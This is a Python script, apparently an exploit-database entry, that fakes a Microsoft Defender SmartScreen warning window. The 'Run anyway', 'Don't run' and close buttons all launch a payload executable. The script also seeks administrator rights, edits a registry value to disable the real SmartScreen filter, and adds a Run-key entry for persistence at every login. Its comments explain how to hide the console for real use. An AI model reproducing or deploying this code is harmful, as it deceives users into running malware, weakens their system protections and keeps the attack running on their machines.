# Exploit Title: payload Execution by Fake Windows SmartScreen with requires Administrator privileges & Turn off real SmartScreen Filter
# Date: 2023-12-14
# Exploit Author: S3N4T0R
# Build: pyinstaller --onefile Checkmate.py

import tkinter as tk
import subprocess
import os
import ctypes, sys
import winreg as reg
import sys

# Running with administrator privileges

# Note: This requires Administrator privileges, If you do not want to disable Windows SmartScreen, you can remove it from line 16 to line 39

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
        
# Do not forget to hide the CMD window & remove the printing line

if is_admin():

    print("Running with administrator privileges.")
else:

    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

# Turn off real SmartScreen Filter 

def turn_off_smartscreen():
    # Change the registry value
    os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "DisableSmartScreenFilter" /t REG_DWORD /d "0" /f')

turn_off_smartscreen()

def dont_run_action():

# Add your payload directory here 👇️
    
    other_command = r'C:\Users\username\payload.exe'
    
# Don't forget to remove this line in the real testing operation
    
    log_file = r'C:\Users\username\command_log.txt'


    with open(log_file, 'w') as log:
        process = subprocess.Popen(['cmd.exe', '/c', other_command], shell=True, stdout=log, stderr=log)
        process.communicate()

def on_close_enter(event):
    close_button.config(bg="red", fg="white")

def on_close_leave(event):
    close_button.config(bg="white", fg="black")

def simulate_smartscreen_window():
    global window
    window = tk.Tk()
    window.title("")
    
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()
    
    x_position = (screen_width - 529) // 2
    y_position = (screen_height - 500) // 2
    
    window.geometry(f"529x500+{x_position}+{y_position}")

    window.overrideredirect(True)

    window.configure(bg="#005a9e")

# I wrote each line of the message individually and did not use (\n) In because when using it, the lines are very close together. Instead, I      wrote each line individually and used the value equal to (pady=0)

    label = tk.Label(window, text="Windows protected your PC", font=("Arial", 20, "bold"), bg="#005a9e", fg="white")
    label.pack(pady=20, padx=20, anchor=tk.NW)

    label = tk.Label(window, text="Microsoft Defender SmartScreen prevented an unrecognized app from", font=("Arial", 10, "bold"), bg="#005a9e", fg="white")
    label.pack(pady=0, padx=20, anchor=tk.NW)


    label = tk.Label(window, text="starting. Running this app might put your PC at risk.", font=("Arial", 10, "bold"), bg="#005a9e", fg="white")
    label.pack(pady=0, padx=20, anchor=tk.NW)


    label = tk.Label(window, text="More info", font=("Arial", 10, "bold"), bg="#005a9e", fg="white")
    label.pack(pady=0, padx=20, anchor=tk.NW)


    button_frame = tk.Frame(window, bg="#005a9e")
    button_frame.pack(side=tk.BOTTOM, padx=20, pady=10, anchor=tk.SE)

# Note: There are some differences in Windows Smart Screen version, such as the background colors of the options, some of which are blue, and the other dimension has a white background. You can control this by modifying the script. Also, there are some  that contain the word “Don’t run” without “Run anyway”

    dont_run_button = tk.Button(button_frame, text="Run anyway", font=("Arial", 11, "bold"), fg="black", bg="white", relief=tk.RAISED, command=dont_run_action)
    dont_run_button.pack(side=tk.RIGHT, padx=10)

    dont_run_button = tk.Button(button_frame, text="Don't run", font=("Arial", 11, "bold"), fg="black", bg="white", relief=tk.RAISED, command=dont_run_action)
    dont_run_button.pack(side=tk.RIGHT, padx=5)

    global close_button
    close_button = tk.Button(window, text="   x   ", font=("Arial", 12, "bold"), fg="black", bg="white", relief=tk.FLAT, command=dont_run_action, borderwidth=0, highlightthickness=0)
    close_button.place(x=490, y=0)

    close_button.bind("<Enter>", on_close_enter)
    close_button.bind("<Leave>", on_close_leave)

    window.mainloop()

# The registry entry is intended to run the script (sys.argv[0]) every time the user logs in

def add_registry_entry():
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    script_path = os.path.abspath(sys.argv[0])

    try:
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
            reg.SetValueEx(key, 'SmartScreen', 0, reg.REG_SZ, script_path)
    except Exception as e:
        print(f"Error adding registry entry: {e}")

if __name__ == "__main__":
    simulate_smartscreen_window()
    add_registry_entry()

